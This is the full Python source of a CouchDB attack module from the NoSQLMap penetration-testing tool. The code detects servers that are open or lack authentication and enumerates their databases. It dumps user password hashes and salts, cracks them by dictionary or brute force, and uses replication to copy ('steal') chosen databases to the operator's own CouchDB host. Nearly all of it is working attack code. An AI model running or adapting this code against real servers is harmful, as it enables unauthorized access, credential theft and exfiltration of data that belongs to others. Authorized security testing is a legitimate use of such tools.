#!/usr/bin/env python3
# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
# See the file 'doc/COPYING' for copying permission

from .exception import NoSQLMapException
import couchdb
import urllib.request
import urllib.parse
import urllib.error
import requests
import socket
import subprocess
import sys
import unittest
import hashlib
from binascii import a2b_hex
import string
import itertools
from hashlib import sha1
import os


global dbList
global yes_tag
global no_tag
yes_tag = ['y', 'Y']
no_tag = ['n', 'N']

def args():
    return []

def _verLess13(ver):
    # Robustly decide whether a CouchDB version string is < 1.3 without the old
    # float(ver[0:3]) trick (which ValueErrors on 'v'-prefixed builds and
    # misparses two-digit components like '0.10').
    try:
        parts = str(ver).lstrip("vV").split(".")
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
        return (major, minor) < (1, 3)
    except (ValueError, IndexError, TypeError):
        return False

def couchScan(target,port,pingIt):
    if pingIt == True:
        # argv form (no shell) so a hostile scanned IP/hostname cannot inject
        # shell commands onto the operator's box.
        test = subprocess.call(["ping", "-c", "1", "-n", "-W", "1", str(target)],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if test != 0:
            return [4, None]

    try:
        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
        try:
            dbVer = conn.version()
            return [0, dbVer]

        except couchdb.http.Unauthorized:
            return [1, None]

        except couchdb.http.HTTPError:
            return [2, None]

    except (socket.error, ConnectionError, OSError):
        return [3, None]

def netAttacks(target,port, myIP, args = None):
    print("DB Access attacks (CouchDB)")
    print("======================")
    mgtOpen = False
    webOpen = False
    mgtSelect = True
    # This is a global for future use with other modules; may change
    dbList = []
    print("Checking to see if credentials are needed...")
    needCreds = couchScan(target,port,False)

    if needCreds[0] == 0:
        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
        print("Successful access with no credentials!")
        mgtOpen = True

    elif needCreds[0] == 1:
            print("Login required!")
            srvUser = input("Enter server username: ")
            srvPass = input("Enter server password: ")
            uri = "http://" + urllib.parse.quote(srvUser, safe="") + ":" + urllib.parse.quote(srvPass, safe="") + "@" + target + ":" + str(port) + "/"

            try:
                conn = couchdb.Server(uri)
                # couchdb.Server is lazy; force a request so bad creds surface here.
                conn.version()
                print("CouchDB authenticated on " + target + ":" + str(port))
                mgtOpen = True

            except couchdb.http.Unauthorized:
                input("Failed to authenticate.  Press enter to continue...")
                return
            except (socket.error, ConnectionError, OSError, couchdb.http.HTTPError):
                input("Couldn't reach CouchDB.  Press enter to continue...")
                return

    elif needCreds[0] == 2:
        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
        print("Access check failure.  Testing will continue but will be unreliable.")
        mgtOpen = True

    elif needCreds[0] == 3:
        input("Couldn't connect to CouchDB server.  Press enter to return to the main menu.")
        return


    mgtUrl = "http://" + target + ":" + str(port) + "/_utils"
    # Future rev:  Add web management interface parsing
    try:
        mgtRespCode = urllib.request.urlopen(mgtUrl, timeout=5).getcode()
        if mgtRespCode == 200:
            print("Sofa web management open at " + mgtUrl + ".  No authentication required!")

    except (urllib.error.URLError, urllib.error.HTTPError, OSError):
        print("Sofa web management closed or requires authentication.")

    if mgtOpen == True:
        while mgtSelect:
            print("\n")
            print("1-Get Server Version and Platform")
            print("2-Enumerate Databases/Users/Password Hashes")
            print("3-Check for Attachments (still under development)")
            print("4-Clone a Database")
            print("5-Return to Main Menu")
            attack = input("Select an attack: ")

            if attack == "1":
                print("\n")
                getPlatInfo(conn,target)

            if attack == "2":
                print("\n")
                enumDbs(conn,target,port)

            if attack == "3":
                print("\n")
                enumAtt(conn,target,port)

            if attack == "4":
                    print("\n")
                    stealDBs(myIP,conn,target,port)

            if attack == "5":
                    return


def getPlatInfo(couchConn, target):
    print("Server Info:")
    try:
        print("CouchDB Version: " + couchConn.version())
    except (socket.error, OSError, couchdb.http.HTTPError) as e:
        print("Couldn't retrieve version: " + str(e))
    return


def enumAtt(conn, target, port):
    print("Enumerating all attachments...")
    try:
        dbList = [db for db in conn]
    except (socket.error, OSError, couchdb.http.HTTPError) as e:
        print("Couldn't list databases: " + str(e))
        return

    found = False
    for dbName in dbList:
        try:
            r = requests.get("http://" + target + ":" + str(port) + "/" + dbName + "/_all_docs",
                             params={"include_docs": "true"}, timeout=10)
            rows = r.json().get("rows", [])
        except (requests.RequestException, ValueError) as e:
            print("  " + dbName + ": error (" + str(e) + ")")
            continue

        for row in rows:
            doc = row.get("doc") or {}
            for name, meta in (doc.get("_attachments", {}) or {}).items():
                found = True
                meta = meta or {}
                print("  " + dbName + "/" + str(doc.get("_id", "?")) + " -> " + name +
                      " (" + str(meta.get("length", "?")) + " bytes, " + str(meta.get("content_type", "")) + ")")

    if not found:
        print("No attachments found.")
    return



def enumDbs (couchConn,target,port):
    dbList = []
    try:
        for db in couchConn:
            dbList.append(db)

        print("List of databases:")
        print("\n".join(dbList))
        print("\n")

    except (socket.error, OSError, couchdb.http.HTTPError):
        print("Error:  Couldn't list databases.  The provided credentials may not have rights.")

    if '_users' not in dbList:
        return

    # Bound the query so it does not walk past the user docs into _design/_auth,
    # and tolerate a partial / non-JSON response instead of crashing.
    try:
        r = requests.get("http://" + target + ":" + str(port) + "/_users/_all_docs",
                         params={"startkey": '"org.couchdb.user:"',
                                 "endkey": '"org.couchdb.user;"',
                                 "include_docs": "true"},
                         timeout=10)
        rows = r.json().get("rows", [])
    except (requests.RequestException, ValueError) as e:
        print("Couldn't read _users: " + str(e))
        return

    try:
        dbVer = couchConn.version()
    except (socket.error, OSError, couchdb.http.HTTPError):
        dbVer = ""
    legacy = _verLess13(dbVer)

    users = []
    for row in rows:
        doc = row.get("doc")
        rid = row.get("id", "")
        if not doc or ":" not in rid:
            continue  # skip _design/_auth and malformed rows
        name = rid.split(":", 1)[1]
        salt = doc.get("salt", "")
        if legacy:
            h = doc.get("password_sha")
            iters = None
        else:
            h = doc.get("derived_key")
            iters = int(doc.get("iterations", 10))
        if h is None:
            continue
        users.append((name, h, salt, iters))

    if not users:
        print("No crackable user documents found in _users.")
        return

    print("Database Users and Password Hashes:")
    for name, h, salt, iters in users:
        print("Username: " + name)
        print("Hash: " + h)
        print("Salt: " + salt)
        if iters is not None:
            print("Iterations: " + str(iters))
        print("\n")

        crack = input("Crack this hash (y/n)? ")
        if crack in yes_tag:
            passCrack(name, h, salt, iters, dbVer)

    return


def stealDBs (myDB,couchConn,target,port):
    menuItem = 1
    dbList = []

    for db in couchConn:
        dbList.append(db)

    if len(dbList) == 0:
        print("Can't get a list of databases to steal.  The provided credentials may not have rights.")
        return

    for dbName in dbList:
        print(str(menuItem) + "-" + dbName)
        menuItem += 1

    while True:
        dbLoot = input("Select a database to steal:")
        if dbLoot.isdigit() and 1 <= int(dbLoot) < menuItem:
            break
        print("Invalid selection.")

    try:
        # Create the DB target first
        myServer = couchdb.Server("http://" + myDB + ":5984")
        srcName = dbList[int(dbLoot)-1]
        myServer.create(srcName + "_stolen")
        couchConn.replicate(srcName, "http://" + myDB + ":5984/" + srcName + "_stolen")

        cloneAnother = input("Database cloned.  Copy another (y/n)? ")

        if cloneAnother in yes_tag:
            stealDBs(myDB,couchConn,target,port)

        else:
            return

    except (socket.error, OSError, couchdb.http.HTTPError) as e:
        input("Something went wrong (" + str(e) + ").  Are you sure your CouchDB is running and options are set? Press enter to return...")
        return


def passCrack (user, encPass, salt, iterations, dbVer):
    select = True
    print("Select password cracking method: ")
    print("1-Dictionary Attack")
    print("2-Brute Force")
    print("3-Exit")

    while select:
            select = input("Selection: ")

            if select == "1":
                select = False
                dict_pass(encPass, salt, iterations, dbVer)

            elif select == "2":
                    select = False
                    brute_pass(encPass, salt, iterations, dbVer)

            elif select == "3":
                    return
    return


def genBrute(chars, maxLen):
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))


def _couchMatch(passw, salt, iterations, hashVal, dbVer):
    # CouchDB hashing changed in v1.3: pre-1.3 = salted SHA1, 1.3+ = PBKDF2-SHA1
    # with the per-user iteration count (the old code hardcoded 10, so cracking
    # silently failed against every modern install whose count differs).
    if _verLess13(dbVer):
        return gen_pass_couch(passw, salt, hashVal)
    return gen_pass_couch13(passw, salt, int(iterations or 10), hashVal)


def brute_pass(hashVal, salt, iterations, dbVer):
    print("\n")
    maxLen = input("Enter the maximum password length to attempt: ")
    print("1-Lower case letters")
    print("2-Upper case letters")
    print("3-Upper + lower case letters")
    print("4-Numbers only")
    print("5-Alphanumeric (upper and lower case)")
    print("6-Alphanumeric + special characters")
    charSel = input("\nSelect character set to use:")

    if charSel == "1":
        chainSet = string.ascii_lowercase

    elif charSel == "2":
        chainSet= string.ascii_uppercase

    elif charSel == "3":
        chainSet = string.ascii_letters

    elif charSel == "4":
        chainSet = string.digits

    elif charSel == "5":
        chainSet = string.ascii_letters + string.digits

    elif charSel == "6":
        chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"

    else:
        print("Invalid character set selection.")
        return

    if not maxLen.isdigit():
        print("Maximum length must be a number.")
        return

    count = 0
    print("\n", end="")

    for attempt in genBrute (chainSet,int(maxLen)):
        print("\rCombinations tested: " + str(count), end="")
        count += 1
        if _couchMatch(attempt, salt, iterations, hashVal, dbVer):
            break


def dict_pass(key, salt, iterations, dbVer):
    loadCheck = False

    while loadCheck == False:
        dictionary = input("Enter path to password dictionary: ")

        try:
            with open (dictionary) as f:
                passList = f.readlines()
                loadCheck = True

        except OSError:
            print(" Couldn't load file.")

    print("Running dictionary attack...")

    for passGuess in passList:
        temp = passGuess.rstrip("\n")
        if _couchMatch(temp, salt, iterations, key, dbVer):
            break

    return


def gen_pass_couch(passw, salt, hashVal):
    if sha1((passw+salt).encode()).hexdigest() == hashVal:
        print("Password Cracked - "+passw)
        return True

    else:
        return False


def gen_pass_couch13(passw, salt, iterations, hashVal):
    result = hashlib.pbkdf2_hmac('sha1', passw.encode(), salt.encode(), iterations, dklen=20)
    expected = a2b_hex(hashVal)
    if result == expected:
        print("Password Cracked- "+passw)
        return True
    else:
        return False
